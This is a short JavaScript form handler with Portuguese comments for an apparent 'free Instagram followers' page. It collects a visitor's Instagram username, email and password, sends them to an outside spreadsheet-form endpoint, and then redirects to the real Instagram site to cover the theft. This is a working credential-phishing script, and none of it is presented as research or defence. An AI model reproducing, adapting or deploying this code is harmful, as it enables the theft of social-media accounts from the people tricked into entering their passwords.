document.getElementById("submitButton").addEventListener("click", function () {
    // Captura os valores dos formulários
    const instagramName = document.getElementById("instagramName").value.trim();
    const followers = document.getElementById("followers").value.trim();
    const email = document.getElementById("email").value.trim();
    const senha = document.getElementById("senha").value.trim();

    // Validação dos campos
    if (!instagramName || !followers || !email || !senha) {
        alert("Por favor, preencha todos os campos obrigatórios.");
        return;
    }

    if (isNaN(followers) || followers <= 0 || followers > 50000) {
        alert("A quantidade de seguidores deve ser um número entre 1 e 50.000.");
        return;
    }

    // Dados a serem enviados para a API
    const data = {
        instagramName,
        followers,
        email,
        senha,
    };

    // Envia os dados para a API
    fetch("https://api.sheetmonkey.io/form/u9QXfMmnxaWCXdNq6bCYdG", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
    })
        .then((response) => {
            if (response.ok) {
                alert("Dados enviados com sucesso!");
                // Limpa os campos após o envio
                document.getElementById("followerForm").reset();
                document.getElementById("loginForm").reset();

                // Redireciona para o Instagram oficial
                window.location.href = "https://www.instagram.com";
            } else {
                alert("Erro ao enviar os dados. Tente novamente.");
            }
        })
        .catch((error) => {
            console.error("Erro:", error);
            alert("Erro ao enviar os dados. Verifique sua conexão e tente novamente.");
        });
});